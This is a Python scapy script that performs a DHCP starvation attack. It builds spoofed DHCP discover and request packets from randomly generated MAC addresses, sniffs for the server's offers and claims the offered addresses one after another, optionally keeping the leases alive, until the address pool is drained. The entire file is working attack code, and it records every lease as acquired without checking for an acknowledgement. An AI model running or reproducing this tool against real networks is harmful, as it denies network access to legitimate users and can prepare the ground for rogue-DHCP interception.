from scapy.all import *
import time
import binascii
import threading
import sys
from enum import Enum
import inspect
import random
import mac
from types import SimpleNamespace
import logging

import keepalive

logger = logging.getLogger()

IP_GLOBAL_BROADCAST='255.255.255.255'

args = SimpleNamespace()
args.keep_alive=False
args.keep_alive_while_starving=False
args.sniff_interface : str = None
args.ttl = 5


def get_dhcp_type_value(dhcp_type : str):
    return next((k for k, v in DHCPTypes.items() if v == dhcp_type), None)
    

class DHCP_ATTS:
    CLIENT_PORT  = 68
    SERVER_PORT  = 67

"""
TODO option to write pcap
TODO option to get replies without being promisc (wireless)
TODO is in network scapy
TODO refactor BOOTP packet construction
TODO check for dhcp ack
TODO dynamically use htype (hw type) in bootp field
"""


def random_transaction_id():
    """
    makes a random transaction ID
    transaction IDs are random numberes declared by the client
    for the server to be able to differentiate clients 
    """
    function_name = inspect.currentframe().f_code.co_name

    transaction_id = random.randint(0, 0xFFFFFFFF)
    logger.debug(f"{function_name} : random_transaction_id = {transaction_id}")
    return transaction_id


def mac_to_binary(regular_mac : str):
    """
    gets a string, removes collons and turns it to binary representation
    you need to give BOOTP the binary representation of mac in scapy cuz who knows
    """
    function_name = inspect.currentframe().f_code.co_name
    regular_mac_copy = regular_mac
    
    regular_mac = regular_mac.replace(':', '')
    #BOOTP accepts raw mac for some reason

    result = binascii.unhexlify(regular_mac)
    logger.debug(f"{function_name} : {regular_mac_copy} -> {result}")

    return result

def dhcp_request( ip : str, device_mac : str, transaction_id, server_ip : str):
    """
    returns a DHCP request with the source being the args
    """
    function_name = inspect.currentframe().f_code.co_name
    dhcp_options= [('message-type','request'), ('client_id', device_mac), ('requested_addr', ip),('server_id', server_ip),('end')]
    

    request_packet = BOOTP(htype = 'Ethernet (10Mb)', op = 'BOOTREQUEST', chaddr=mac_to_binary(device_mac), xid = transaction_id)\
                    / DHCP(options=dhcp_options)
    logger.debug(f"{function_name} :  {request_packet.summary()}")
    return request_packet

def dhcp_discover(src_mac : str):
    """
    returns a DHCP discover with the source being the arg
    """
    
    dhcp_options = [('message-type', 'discover'), ('client_id', src_mac), ('param_req_list', [1, 3, 6, 15, 31, 33, 43, 44, 46, 47, 119, 121, 249, 252]),('end')]

    discover_packet = BOOTP(htype = 'Ethernet (10Mb)', op = 'BOOTREQUEST' ,chaddr=mac_to_binary(src_mac), xid = random_transaction_id(), ciaddr = '0.0.0.0', flags = 'B')\
                        / DHCP(options=dhcp_options)
    return discover_packet

def is_bootp(packet)->bool:
    """
    checks if theres bootp
    no other checking
    """
    function_name = inspect.currentframe().f_code.co_name

    if(BOOTP not in packet):
        logger.warning(f"{function_name} : packet not BOOTP [{packet}]")
        return False

    return True

def is_dhcp(packet)->bool:
    """
    checks if theres bootp and dhcp
    """
    function_name = inspect.currentframe().f_code.co_name

    if(is_bootp(packet) == False):
        return False

    if(DHCP not in packet):
        logger.warning(f"{function_name} : packet not DHCP [{packet}]")
        return False

    return True

def is_my_dhcp_offer(packet, my_mac : str)->bool:
    
    function_name = inspect.currentframe().f_code.co_name
    
    # to binary
    my_mac = mac_to_binary(my_mac)

    #there is both bootp and dhcp
    if is_dhcp_offer(packet) == False:
        return False
    
    return my_mac in packet[BOOTP].chaddr
        

def capture_my_dhcp_offer(dest_mac : str, interface : str = conf.iface , result_list = None):
    """
    Gets a MAC and server IP
    tries to Capture DHCP responses for the provided MAC
    return value of this function doesn't matter as it is intented to provide the result via result_list
    """
    function_name = inspect.currentframe().f_code.co_name

    logger.info(f"{function_name} : sniffing on interface {interface} for dhcp offers for {dest_mac}")
    
    res = sniff(count=1, filter = f"udp and src port {DHCP_ATTS.SERVER_PORT} and dst port {DHCP_ATTS.CLIENT_PORT}", timeout=4, iface=args.sniff_interface,\
            lfilter= lambda packet : is_my_dhcp_offer(packet, dest_mac))

    if len(res) != 0:
        result_list[0] = res[0]
        result_list.append(res[0][Ether].src)
        logger.debug(f"function_name : captured offer for {dest_mac} from {result_list[1]}")
    
    if len(res) != 0 : logger.info(f"{function_name} : captured {res}")
    else : logger.warning(f"{function_name} : returning None")
    


    return None
    

def is_dhcp_ack(packet)->bool:
    
    if(is_bootp_reply(packet) == False):
        return False
    if(is_dhcp(packet) == False):
        return False

    return is_dhcp_msg_type_eq(packet, get_dhcp_type_value("ack"))

def is_dhcp_offer( packet )->bool:
    """
    return is_bootp_reply(packet) and
        is_dhcp_msg_type_eq(packet, get_dhcp_type_value("offer")) 
    """

    return is_bootp_reply(packet) and\
            is_dhcp_msg_type_eq(packet, get_dhcp_type_value("offer")) 

def is_dhcp_msg_type_eq(packet, value : int )->bool:
    """
    Won't check if packet is dhcp the caller must do it 
    Searches for dhcp option field and then returns true if message type field of dhcp pdu is equal to value
    """  
    function_name = inspect.currentframe().f_code.co_name

    message_type_index = find_dhcp_option('message-type', packet[DHCP])

    #there is no message-type option in dhcp packet
    if message_type_index == -1 : 
        #we assumed the packet is dhcp so there must be a message type
        logger.warning(f"{function_name} : no message-type in [{packet}]")
        return False

    logger.debug(f"{function_name} : message-type in {message_type_index}th index of {packet}")

    return packet[DHCP].options[message_type_index][1] == value 

def is_for_my_mac(mac : str, packet):
    function_name = inspect.currentframe().f_code.co_name
    
    logger.debug(f"{function_name} : {packet} is destined for {packet[Ether].dst} and provided mac is {mac}")
    return packet[Ether].dst == mac

def find_dhcp_option(option : str, dhcp_pdu : DHCP)->int:
    """
    Doesnt check is pdu is dhcp
    Gets a DHCP PDU and a MAC
    Returns -1 if the DHCP PDU doesn't include the option
    """
    function_name = inspect.currentframe().f_code.co_name

    for i in range (0,len(dhcp_pdu.options)): 
        if dhcp_pdu.options[i][0] == option : return i
    
    logger.debug(f"{function_name} : {dhcp_pdu} doen't contain {option}")
    return -1

def is_bootp_reply(packet)->bool:
    """
    False if is_bootp() is False or is not a BOOTPREPLY
    """
    function_name = inspect.currentframe().f_code.co_name

    if(is_bootp(packet) == False):
        return False

    logger.debug(f"{function_name} : {packet} packet[BOOTP].op == BOOTREPLY is {packet[BOOTP].op == BOOTP.op.s2i['BOOTREPLY']}")
    #is a BOOTPREPLY
    return packet[BOOTP].op == BOOTP.op.s2i['BOOTREPLY']



def starve_ips( server_ip : str, server_mac : str , interface : str = conf.iface ,sniff_interface : str = conf.iface, ips_to_starve : int = 5, keep_alive = False)->list[tuple[str, str, str]]:
    """
    TODO check if dhcp request if acked
    TODO warn about NAKs
    starves ips at the given interface and returns a list of (ip, mac, interface) that are occupied in
    this starvation session
    """

    template_udp_packet = Ether(dst=ETHER_BROADCAST)\
                    / IP(dst=IP_GLOBAL_BROADCAST,src='0.0.0.0',ttl=args.ttl)\
                    / UDP(dport=DHCP_ATTS.SERVER_PORT,sport=DHCP_ATTS.CLIENT_PORT)\

    function_name = inspect.currentframe().f_code.co_name
    
    occupied_ips: list[tuple[str, str]] = []
    is_acked : bool = True

    logger.info(f"{function_name} : starving {ips_to_starve} IPs from {server_ip} , {server_mac}")

    i = 0
    
    time_to_wait = 1

    while (len(occupied_ips) < ips_to_starve):
        
        time.sleep(time_to_wait)
        
        if(keep_alive and (len(occupied_ips) != 0)):
            keep_alive_thread = threading.Thread(target=keepalive.keep_ips_alive_icmp, args=[occupied_ips, server_ip, server_mac])
            logger.info(f"{function_name} : keeping alive while starving")
            keep_alive_thread.start()

        logger.info(f"{function_name} : attempt {i} captured {len(occupied_ips)} IP's time_to_wait {time_to_wait}")
        i += 1

        mac_template = mac.macs[random.randint(0,len(mac.macs) - 1)][0]

        temp_mac = str(RandMAC(mac_template))
        template_udp_packet[Ether].src = temp_mac

        offer = [None]
        
        sniff_thread = threading.Thread(target=capture_my_dhcp_offer, args=[temp_mac, sniff_interface ,offer])
        sniff_thread.start()
        
        time.sleep(0.2)
        sendp(
                template_udp_packet / dhcp_discover(temp_mac), 
                interface)
        
        sniff_thread.join()
        
        if(offer[0] is None):
            logger.warning('no offer captured')
            time_to_wait += 1
            try:
                keep_alive_thread.join()
            except:1
            continue
        
        offered_ip = offer[0][BOOTP].yiaddr
        
        logger.info(offered_ip + ',' + temp_mac)
        
        #TODO start a thread that sniffs for ACK or NAK

        sendp(
                template_udp_packet / dhcp_request(offered_ip, temp_mac, random_transaction_id(), server_ip), 
                interface)
        
        #TODO stop the thread and check if we got ACKed

        if(is_acked):
            occupied_ips.append((offered_ip, temp_mac, interface))
        
        try:

            keep_alive_thread.join()

        except:1
        
        if(time_to_wait >= 2):
            time_to_wait -= 1
    return occupied_ips


